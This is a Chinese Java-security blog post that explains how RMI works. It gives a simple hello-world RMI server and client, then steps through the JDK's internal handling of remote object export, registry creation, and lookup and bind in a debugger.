<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="Okaytc" />
  <meta name="description" content="生活 健身 学习 沉淀" />
  
  
  <title>
    
      java安全-RMI&amp;LDAP&amp;JNDI原理分析学习 
      
      
      |
    
     Okaytc
  </title>

  
    <link rel="apple-touch-icon" href="/images/head-3.jpg">
    <link rel="icon" href="/images/head-3.jpg">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  
    
<link rel="stylesheet" href="/css/figcaption/mac-block.css">

  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/head-3.jpg" alt="">
      
    </a>
    <div class="nickname"><a href="/">Okaytc</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">主页</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">文章</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">标签</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">友链</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">关于</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">java安全-RMI&LDAP&JNDI原理分析学习</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
          2023-02-09 17:00:00
        </span>
        
              <span class="post-tags">
                <i class="iconfont icon-tags mr-10" title="标签"></i>
                
                <span class="span--tag mr-8">
                  <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
                    #Java安全
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>学习三个协议的源码分析，源码基础实现和漏洞分析学习写了很大篇幅，高版本绕过没写进去，费了挺长时间。</p>
<h1 id="0x01、RMI"><a href="#0x01、RMI" class="headerlink" title="0x01、RMI"></a>0x01、RMI</h1><h2 id="一、RMI描述"><a href="#一、RMI描述" class="headerlink" title="一、RMI描述"></a>一、RMI描述</h2><p>RMI（远程方法调用），java的一种用于实现远程过程调用的应用程序接口，采用分布式应用程序思想。</p>
<p>主要构成：<br><strong>Client(客户端)</strong> ：通过向注册中心获取服务端信息进而远程调用服务器。</p>
<ul>
<li>存根（skeleton）&#x2F;桩(Stub)：远程对象在客户端上的代理。</li>
<li>远程引用层(Remote Reference Layer):解析并执行远程引用协议</li>
<li>传输层(Transport):发送调用、传递远程方法参数、接收远程方法执行结果。</li>
</ul>
<p><strong>Server(服务端)</strong> ：开启远程调用的服务器。</p>
<ul>
<li>骨架(Skeleton):读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值。</li>
<li>远程引用层(Remote Reference Layer):处理远程引用后向骨架发送远程方法调用。</li>
<li>传输层(Transport):监听客户端的入站连接，接收并转发调用到远程引用层。</li>
</ul>
<p><strong>Registry(注册中心)</strong> ：以URL形式注册远程对象，并向客户端回复对远程对象的引用。</p>
<p>引用官方的图：</p>
<p><img src="/posts/ad3be040/r-1.png" title="rmi"></p>
<p>其中实现远程方法的类必须实现Remote接口，并且该类必须继承UnicastRemoteObject类。<br>或者可以不继承UnicastRemoteObject类，调用UnicastRemoteObject.exportObject()手工进行初始化。</p>
<p><img src="/posts/ad3be040/r-2.png" title="不继承实现"></p>
<p>注：客户端和服务端的接口需要相同的包名才能序列化反序列化</p>
<h2 id="二、RMI简单实现"><a href="#二、RMI简单实现" class="headerlink" title="二、RMI简单实现"></a>二、RMI简单实现</h2><p>简述实现过程:<br>服务器端（Server）：</p>
<ul>
<li>先创建实现Remote的接口</li>
<li>实现远程调用服务对象类</li>
<li>创建服务端类，对实现Remote的接口对象生成远程调用服务类，通过注册中心绑定该调用对象。</li>
</ul>
<p>客户端（Client）:</p>
<ul>
<li>先创建实现Remote的接口</li>
<li>通过注册中心获取远程调用服务端口，将服务名绑定给接口对象</li>
<li>接口对象调用远程服务端程序执行方法。</li>
</ul>
<h3 id="1、服务端"><a href="#1、服务端" class="headerlink" title="1、服务端"></a>1、服务端</h3><p>实现Remote的对象接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIObject</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/ad3be040/r-3.png" title="实现Remote的对象接口"></p>
<p>实现调用服务类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RMIObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">        <span class="comment">//UnicastRemoteObject.exportObject(this,0);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;远程调用输出：&quot;</span>+hello);</span><br><span class="line">        <span class="keyword">return</span> hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/ad3be040/r-4.png" title="实现调用服务类"></p>
<p>开启服务端:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="comment">//创建远程调用对象，这一步已经开启远程调用服务了</span></span><br><span class="line">        RMIObject rmo=<span class="keyword">new</span> <span class="title class_">RMIObjectImpl</span>();</span><br><span class="line">        <span class="comment">//创建注册中心绑定调用端口</span></span><br><span class="line">        Registry rg= LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//注册绑定调用服务</span></span><br><span class="line">        rg.bind(<span class="string">&quot;RMIObject&quot;</span>,rmo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/ad3be040/r-7.png" title="开启服务端"></p>
<h3 id="2、客户端"><a href="#2、客户端" class="headerlink" title="2、客户端"></a>2、客户端</h3><p>实现Remote的对象接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIObject</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/ad3be040/r-8.png" title="实现Remote的对象接口"></p>
<p>客户端进行远程调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        Registry rg= LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        RMIObject rc=(RMIObject) rg.lookup(<span class="string">&quot;RMIObject&quot;</span>);</span><br><span class="line">        rc.hello(<span class="string">&quot;hey&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/ad3be040/r-9.png" title="客户端"></p>
<h3 id="3、实现"><a href="#3、实现" class="headerlink" title="3、实现"></a>3、实现</h3><p>客户端执行远程调用</p>
<p><img src="/posts/ad3be040/r-5.png" title="客户端远程调用"></p>
<p>服务端被调用执行</p>
<p><img src="/posts/ad3be040/r-6.png" title="服务端被调用"></p>
<h2 id="三、底层调试分析"><a href="#三、底层调试分析" class="headerlink" title="三、底层调试分析"></a>三、底层调试分析</h2><p>涉及相关知识点描述：</p>
<ul>
<li>TCPEndpoint：TCP端点，实现通讯的一个接口</li>
<li>ObjID：标识RMI运行时的远程对象，所有服务通过ObjID来调用</li>
<li>liveRef：将ObjID和TCPEndpoint进行封装起来连接使用</li>
<li>Target：封装远程对象的信息包括上述的信息</li>
</ul>
<h3 id="1、服务端创建"><a href="#1、服务端创建" class="headerlink" title="1、服务端创建"></a>1、服务端创建</h3><p>创建远程服务断点</p>
<p><img src="/posts/ad3be040/r-10.png" title="远程服务调试"></p>
<p>跟进远程调用类</p>
<p><img src="/posts/ad3be040/r-11.png" title="远程服务调试"></p>
<p>调用到父类<code>UnicastRemoteObject</code>的构造函数，端口为0（表示未设定端口，默认传入0，即后续会随机生成端口），继续跟进</p>
<p><img src="/posts/ad3be040/r-12.png" title="远程服务调试"></p>
<p>通过<code>exportObject</code>导出远程对象，将远程调用类和端口传入，继续跟进</p>
<p>此时通过<code>UnicastServerRef</code>处理端口信息，处理完后再次调用<code>exportObject</code>导出远程对象</p>
<p><img src="/posts/ad3be040/r-13.png" title="远程服务调试"></p>
<p>跟进<code>UnicastServerRef</code>方法，方法调用<code>LiveRef</code>类去处理port</p>
<p><img src="/posts/ad3be040/r-14.png" title="UnicastServerRef"></p>
<p>跟进<code>LiveRef</code>构造方法,通过<code>new objID()</code>生成一个对象id,然后调用带<code>LiveRef</code>类的参构造方法</p>
<p><img src="/posts/ad3be040/r-15.png" title="LiveRef"></p>
<p>继续跟进带参构造方法</p>
<p><img src="/posts/ad3be040/r-16.png" title="带参LiveRef"></p>
<p>通过调用<code>TCPEndpoint.getLocalEndpoint(port)</code>方法对端口进行处理</p>
<p><img src="/posts/ad3be040/r-17.png" title="TCPEndpoint.getLocalEndpoint"></p>
<p>跟进<code>getLocalEndpoint</code>方法，该方法经过TCP的相关属性建立，获取在本地地址中的TCP通信结点，端口为传进去的0，地址为本地ip地址。最后返回<code>TCPEndpoint</code>对象。</p>
<p><img src="/posts/ad3be040/r-18.png" title="TCPEndpoint.getLocalEndpoint"></p>
<p>再通过Liveref构造方法，将ep、id、islocal属性赋值。</p>
<p><img src="/posts/ad3be040/r-19.png" title="liveref"></p>
<p>创建了<code>liveref</code>过后，再将<code>liveref</code>传入<code>UnicastServerRef</code>的父类构造函数创建远程服务引用当中</p>
<p><img src="/posts/ad3be040/r-20.png" title="UnicastServerRef"></p>
<p>调用父类的构造函数，将<code>livefref</code>赋值给<code>ref</code>变量，可以看到<code>liveref</code>主要就是TCP连接的核心封装。</p>
<p><img src="/posts/ad3be040/r-21.png" title="ref"></p>
<p>获取了<code>ref</code>过后，再对<code>obj</code>对象（此时为服务端的远程调用对象）和<code>ref</code>进行<code>exportObject</code>导出对象操作</p>
<p><img src="/posts/ad3be040/r-22.png" title="exportObject"></p>
<p>过程中会判断<code>obj</code>对象是否属于<code>UnicastRemoteObject</code>类，属于则将<code>sref</code>赋值给<code>ref</code>，表示此时的<code>ref</code>为服务端的TCP结点信息，然后再调用<code>sref</code>的<code>exportObject</code>导出对象操作</p>
<p><img src="/posts/ad3be040/r-24.png" title="sref.exportObject"></p>
<p>进入<code>UnicastServerRef</code>的导出操作中，通过反射获取到远程调用类，再创建<code>stub</code>存根（服务端创建<code>stub</code>存根，发送给注册中心，客户端从注册中心拿到<code>stub</code>存根，使用stub存根跟远程服务器进行通信），并对<code>stub</code>创建动态代理，代理<code>handler</code>处理还是由<code>liveref</code>处理请求。</p>
<p><img src="/posts/ad3be040/r-23.png" title="stub"></p>
<p>最后将上面的信息通过<code>target</code>方法进行整合到一个对象上来，存放了<code>stub</code>、<code>impl远程服务对象</code>、<code>UnicastServerRef</code>等信息。</p>
<p><img src="/posts/ad3be040/r-25.png" title="target"><br><img src="/posts/ad3be040/r-26.png" title="target"></p>
<p>其中<code>UnicastServerRef</code>的通信对象和<code>stub</code>的通信对象为同一个<code>liveref</code>，表示引用同一个网络通信</p>
<p><img src="/posts/ad3be040/r-27.png" title="target"></p>
<p>创建好<code>target</code>后，最后再将<code>target</code>通过<code>exportObj</code>方法导出来</p>
<p><img src="/posts/ad3be040/r-28.png" title="target"></p>
<p>即调用<code>liveref</code>的<code>exportObj</code>，其中的<code>ep</code>为<code>TCPEndpoint</code>，再调用<code>TCPEndpoint.exportObj()</code></p>
<p><img src="/posts/ad3be040/r-29.png" title="exportObject"></p>
<p>再接着调用<code>TCPTransport.exportObj()</code></p>
<p><img src="/posts/ad3be040/r-30.png" title="exportObject"></p>
<p>通过<code>listen()</code>方法开启监听，开启网络socket通信</p>
<p><img src="/posts/ad3be040/r-31.png" title="listen"><br><img src="/posts/ad3be040/r-32.png" title="listen"></p>
<p>创建socket中，其中回对<code>listenport</code>监听端口进行判断，如果为0，则调用<code>server.getLocalPort()</code>方法</p>
<p><img src="/posts/ad3be040/r-33.png" title="listenport"></p>
<p>跟进<code>server.getLocalPort()</code>方法，调用<code>getImpl().getLocalPort()</code>，<code>getImpl()</code>获取<code>impl</code>对象（即图中的<code>DualStackPlainSocketlmpl</code>对象），然后再调用<code>getLocalPort()</code>获取<code>localport</code></p>
<p><img src="/posts/ad3be040/r-36.png" title="server.getLocalPort()"></p>
<p>此时的<code>impl</code>对象（<code>DualStackPlainSocketlmpl</code>）中已经存在<code>localport</code>，表明在此步骤前就已经生成了该<code>impl</code>对象的随机<code>localport</code>。</p>
<p><img src="/posts/ad3be040/r-37.png" title="localport"></p>
<p>往前追溯，发现<code>impl</code>对象的<code>localport</code>在<code>createServerSocket</code>创建服务<code>socket server</code>的时候生成的，接着跟，下面的图都是调用情况，直接跟进</p>
<p><img src="/posts/ad3be040/r-38.png" title="createServerSocket"><br><img src="/posts/ad3be040/r-39.png" title="createServerSocket"><br><img src="/posts/ad3be040/r-40.png" title="createServerSocket"><br><img src="/posts/ad3be040/r-44.png" title="ServerSocket"><br><img src="/posts/ad3be040/r-45.png" title="bind"><br><img src="/posts/ad3be040/r-46.png" title="bind"></p>
<p>一直到<code>PlainSocketlmpl.bind</code>方法，此时<code>impl</code>为<code>DualStackPlainSocketlmpl</code>对象，当前<code>localport</code>还没有赋值</p>
<p><img src="/posts/ad3be040/r-41.png" title="PlainSocketlmpl.bind"></p>
<p>继续跟进，到<code>AbstractPlainSocketlmpl.bind</code>方法，再跟进<code>socketBind</code>方法</p>
<p><img src="/posts/ad3be040/r-42.png" title="AbstractPlainSocketlmpl.bind"></p>
<p>在<code>socketBind</code>方法中通过<code>localPort0</code>方法生成的随机<code>localport</code>值</p>
<p><img src="/posts/ad3be040/r-43.png" title="localPort0"></p>
<p>回到主体来，判断<code>listenport</code>是否等于0，等于就将生成的随机<code>localport</code>赋值给监听端口，开启新线程等待连接后至此服务端已经将远程调用服务端口发布了出来</p>
<p><img src="/posts/ad3be040/r-33.png" title="listenport"></p>
<p>网络连接开始监听，开启新线程等待连接后至此服务端已经将远程调用服务端口发布了出来</p>
<p>最后调用父类<code>exportObj</code>方法将<code>target</code>发布</p>
<p><img src="/posts/ad3be040/r-47.png" title="exportObj"></p>
<p>这里的作用主要是讲发布的<code>target</code>对象相关数据（ref、stub、impl等信息）存放在<code>hashtable</code>中</p>
<p><img src="/posts/ad3be040/r-48.png" title="putTarget"><br><img src="/posts/ad3be040/r-49.png" title="put"></p>
<p>最后完成整个发布过程，开启监听等待连接。</p>
<p>引用一张su18大佬的服务器远程调用执行图</p>
<p><img src="/posts/ad3be040/r-50.png" title="执行图"></p>
<h3 id="2、注册中心创建"><a href="#2、注册中心创建" class="headerlink" title="2、注册中心创建"></a>2、注册中心创建</h3><p>注册中心绑定对象方法：bind、unbind、rebind<br>查询对象的方法：lookup、list</p>
<hr>
<p>在注册中心创建处下断点</p>
<p><img src="/posts/ad3be040/r-51.png" title="注册中心"></p>
<p>创建代理方法中返回的<code>new RegistryImpl</code>对象，将绑定端口传入</p>
<p><img src="/posts/ad3be040/r-52.png" title="new RegistryImpl"></p>
<p>跟进<code>RegistryImpl</code></p>
<p>先是判断注册端口是不是默认的1099和安全管理器（<code>System.getSecurityManager()</code>）是否开启，当前默认没有开启，因此会进入else代码段中</p>
<p><img src="/posts/ad3be040/r-53.png" title="RegistryImpl"></p>
<p>同服务器端创建一样，也创建了<code>liveRef</code>对象<code>lref</code>，端口为1099</p>
<p><img src="/posts/ad3be040/r-54.png" title="liveRef"><br><img src="/posts/ad3be040/r-55.png" title="liveRef"></p>
<p>然后通过<code>setup</code>方法将<code>lref</code>放入<code>UnicastServerRef</code>对象中然后传进<code>setup</code>方法中，当前环境的java版本（java-1.8.0_332）还将<code>RegistryImpl</code>对象进行注册表过滤</p>
<p><img src="/posts/ad3be040/r-56.png" title="liveRef"></p>
<p>调用父类构造方法也是将<code>liveRef</code>传给<code>Ref</code></p>
<p><img src="/posts/ad3be040/r-57.png" title="liveRef"></p>
<p>返回后，进入<code>setup</code>方法，作用效果跟服务器端创建差不多，也对<code>ref</code>进行导出，只不过加了个<code>permanent</code>表示永久性，服务器端创建的为临时性。</p>
<p><img src="/posts/ad3be040/r-58.png" title="setup"></p>
<p>导出方法相同，对<code>RegistryImpl</code>对象创建动态代理<code>stub</code>，不同的是创建代理中，由于<code>RegistryImpl</code>对象在jdk内置中存在<code>RegistryImpl_stub</code>，因此判断当前对象后缀_stub是否存在时，会返回true表示存在，进行判断体</p>
<p><img src="/posts/ad3be040/r-59.png" title="createProxy"><br><img src="/posts/ad3be040/r-70.png" title="bind"><br><img src="/posts/ad3be040/r-60.png" title="RegistryImpl_stub"></p>
<p>进入<code>createStub</code>方法，将<code>RegistryImpl</code>对象和<code>ref</code>传入，方法比较容易理解，将<code>ref</code>传入<code>RegistryImpl_stub</code>对象并且实例化</p>
<p><img src="/posts/ad3be040/r-61.png" title="RegistryImpl_stub"></p>
<p><code>RegistryImpl_stub</code>对象的存根<code>stub</code>就创建好了</p>
<p><img src="/posts/ad3be040/r-62.png" title="stub"></p>
<p>由于<code>RegistryImpl_stub</code>类是<code>RemoteStub</code>类的子类，因此会进入<code>setSkeleton</code>方法，传参为<code>RegistryImpl</code>对象</p>
<p><img src="/posts/ad3be040/r-63.png" title="RegistryImpl"></p>
<p>传入<code>RegistryImpl</code>调用<code>createSkeleton</code>方法，跟进</p>
<p>跟<code>stub</code>创建一样，都是反射调用自带对应后缀的方法，然后实例化<code>RegistryImpl_Skel</code></p>
<p><img src="/posts/ad3be040/r-64.png" title="RegistryImpl"></p>
<p>创建完后，将上面的所有信息依旧是放入<code>target</code>中，然后将<code>target</code>进行<code>exportObj</code>导出</p>
<p><img src="/posts/ad3be040/r-65.png" title="RegistryImpl"></p>
<p>经过同样步骤监听后面再将信息存入到<code>table</code>表中，步骤同服务器端创建一样</p>
<p><img src="/posts/ad3be040/r-66.png" title="put"><br><img src="/posts/ad3be040/r-67.png" title="table"></p>
<p>到此注册中心创建完成</p>
<p>再查看绑定过程</p>
<p><img src="/posts/ad3be040/r-68.png" title="bind"></p>
<p>绑定过程比较简单，将<code>obj</code>对象和绑定名称放入<code>bindings</code>的<code>hashtable</code>表中进行存储</p>
<p><img src="/posts/ad3be040/r-69.png" title="bind"></p>
<p>到这里，注册中心的创建和绑定就完成</p>
<h3 id="3、客户端调用注册中心"><a href="#3、客户端调用注册中心" class="headerlink" title="3、客户端调用注册中心"></a>3、客户端调用注册中心</h3><p>连接注册中心下断点</p>
<p><img src="/posts/ad3be040/r-71.png" title="连接注册中心"></p>
<p>跟进<code>getRegistry</code>函数</p>
<p><img src="/posts/ad3be040/r-72.png" title="连接注册中心"></p>
<p>在客户端本地生成了<code>liveRef</code>，将<code>ObjID</code>和<code>TCPEndpoint</code>进行封装，<code>host</code>、<code>port</code>为输入指定的</p>
<p><img src="/posts/ad3be040/r-73.png" title="liveRef"></p>
<p>然后将<code>liveRef</code>传入<code>UnicastRef</code>方法中，最后传递给<code>ref</code>对象，相当于再进行了一层封装</p>
<p>返回中调用<code>createProxy</code>创建注册代理，跟进<code>createProxy</code></p>
<p><img src="/posts/ad3be040/r-74.png" title="createProxy"></p>
<p>这里跟注册中心创建<code>stub</code>的步骤一样，通过反射调用实例化<code>RegistryImpl_Stub</code>创建的<code>stub</code></p>
<p><img src="/posts/ad3be040/r-75.png" title="RegistryImpl_Stub"></p>
<p>到这<code>Registry</code>对象获取完成，接下来就是在注册中心<code>lookup</code>查找远程对象名</p>
<p><img src="/posts/ad3be040/r-76.png" title="lookup"></p>
<p>跟进<code>lookup</code>方法，先是通过<code>newCall</code>方法对代理<code>stub</code>获取远程连接，然后对远程连接流写入，写入对象为传进来的远程对象名称（目的是通过序列化传给注册中心我要查找的远程对象名是什么，注册中心再通过反序列化读取客户端传过来的数据）</p>
<p><img src="/posts/ad3be040/r-77.png" title="序列化写入"></p>
<p>写入过后，对<code>call</code>对象执行<code>invoke</code>方法操作，跟进</p>
<p><img src="/posts/ad3be040/r-78.png" title="invoke"></p>
<p>调用<code>call.executeCall()</code>方法，<code>executeCall</code>方法客户端对远程调用通信处理的核心，对获取的数据进行读取，包括读取远程对象的<code>liveRef</code>的<code>ObjID</code></p>
<p><img src="/posts/ad3be040/r-79.png" title="invoke"><br><img src="/posts/ad3be040/r-80.png" title="executeCall"></p>
<p>再将<code>call</code>通信中获取到的数据进行反序列化读取</p>
<p><img src="/posts/ad3be040/r-81.png" title="readObject"></p>
<p>读取后就获取到远程对象的动态代理<code>stub</code>信息了（ObjID、port、liveref等等）</p>
<p><img src="/posts/ad3be040/r-82.png" title="readObject"></p>
<p>完成获取后，就能直接跟服务器端远程通信了</p>
<h3 id="4、注册中心处理客户端调用"><a href="#4、注册中心处理客户端调用" class="headerlink" title="4、注册中心处理客户端调用"></a>4、注册中心处理客户端调用</h3><p>第三部分学习分析的客户端角度的调用，接着看注册中心对客户端的处理，这里重点在连接监听开启后创建的线程中的TCPTransport.run方法，run方法调用run0方法，run0方法调用核心信息读取handleMessages方法</p>
<p>直接从监听中线程开启运行<code>run</code>方法中分析学习</p>
<p><img src="/posts/ad3be040/r-105.png" title="run"></p>
<p><code>run</code>方法调用<code>run0</code>方法</p>
<p><img src="/posts/ad3be040/r-106.png" title="run0"></p>
<p>run0调用主要的读取信息的方法<code>handleMessages</code></p>
<p><img src="/posts/ad3be040/r-107.png" title="handleMessages"></p>
<p>在<code>handleMessages</code>方法中下断点，然后在客户端进行请求，服务器端注册中心会抓到断点信息，这里获取到<code>connection</code>连接信息，获取TCP连接读取流，然后传递给<code>op</code>对象</p>
<p><img src="/posts/ad3be040/r-108.png" title="handleMessages"></p>
<p>根据<code>op</code>值选择条件分支，对<code>conn</code>连接信息创建远程调用对象<code>call</code>，再调用<code>serviceCall</code>方法</p>
<p><img src="/posts/ad3be040/r-109.png" title="serviceCall"></p>
<p>通过<code>id</code>和<code>transport</code>，在<code>target</code>表中获取到远程对象（客户端）的<code>target</code>信息</p>
<p><img src="/posts/ad3be040/r-110.png" title="target"></p>
<p>从远程<code>target</code>对象获取他的<code>disp(UnicastServerRef)</code>后，对其调用<code>dispatch</code>方法</p>
<p><img src="/posts/ad3be040/r-111.png" title="dispatch"></p>
<p>进入<code>dispatch</code>方法后，先是获取读取流，然后判断<code>skel</code>是否存在（用来判断是服务端还是注册中心，注册中心存在<code>skel</code>）</p>
<p><img src="/posts/ad3be040/r-112.png" title="dispatch"></p>
<p>由于是注册中心，因此对进入调用<code>oldDispatch</code>方法（由于java版本不同，方法名和代码会有差别，但大体差不多，除了加的一些防御方法），继续跟进<code>oldDispatch</code>方法</p>
<p>在该方法最后，调用<code>skel.dispatch</code>方法</p>
<p><img src="/posts/ad3be040/r-113.png" title="skel.dispatch"></p>
<p>核心处理就在<code>skel.dispatch</code>方法当中，对不同的端进行不同的处理</p>
<p><img src="/posts/ad3be040/r-114.png" title="skel.dispatch"></p>
<ul>
<li>0表示调用的bind方法</li>
<li>1表示调用的list方法</li>
<li>2表示调用的lookup方法</li>
<li>3表示调用rebind方法</li>
<li>4表示调用unrebind方法</li>
</ul>
<p>由于是客户端发起的，通过<code>lookup</code>调用查询远程对象名，因此会进入2分支</p>
<p><img src="/posts/ad3be040/r-115.png" title="lookup分支"></p>
<p>相关流程注释出来了（低版本则是直接<code>readObject</code>反序列化对象，这里只是反序列化字符串）</p>
<p><img src="/posts/ad3be040/r-116.png" title="lookup分支"></p>
<p>可以看到<code>result</code>已经获取到远程调用对象的liveref<br><code>result</code>从<code>lookup</code>方法中获取，<code>impl</code>的<code>lookup</code>方法也是从<code>bindings</code>的<code>hashtable</code>中获取远程对象名，返回给<code>result</code></p>
<p><img src="/posts/ad3be040/r-118.png" title="result"><br><img src="/posts/ad3be040/r-117.png" title="序列化写入"></p>
<p>注册器处理客户端的大体的流程就到这完成</p>
<h3 id="5、注册中心处理服务端调用"><a href="#5、注册中心处理服务端调用" class="headerlink" title="5、注册中心处理服务端调用"></a>5、注册中心处理服务端调用</h3><p>这里注册中心处理方法大体跟步骤4处理客户端的相同,不重复分析了，只是最后走进的分支不同，<code>bind</code>走进0分支</p>
<p>注:不同的是这实现的步骤是基于服务端和注册端不在一起的情况下，在一起的情况下，服务端<code>bind</code>直接就对注册中心的<code>bind</code>的<code>hashtable</code>进行<code>put</code>了</p>
<p><img src="/posts/ad3be040/r-119.png" title="bind"></p>
<h3 id="6、客户端调用远程服务器方法"><a href="#6、客户端调用远程服务器方法" class="headerlink" title="6、客户端调用远程服务器方法"></a>6、客户端调用远程服务器方法</h3><p>调用处下断点</p>
<p><img src="/posts/ad3be040/r-83.png" title="远程方法调用断点"></p>
<p>跟进会进入到<code>invoke</code>方法（在分析cc1-Lazymap链的时候提到，动态代理对象在调用方法的时候会先进入到动态代理类的<code>invoke</code>方法中，可起到拦截过滤的作用），因为当前对象<code>RMIObject</code>是一个动态代理对象，因此跟进会先进入对应代理类的<code>Invoke</code>方法中</p>
<p><img src="/posts/ad3be040/r-85.png" title="远程代理类"></p>
<p>跟进<code>invoke</code>方法，前面对代理类和方法归属类做一些判断，然后调用<code>invokeRemoteMethod</code>方法，参数为代理、方法名、参数</p>
<p><img src="/posts/ad3be040/r-84.png" title="invoke"></p>
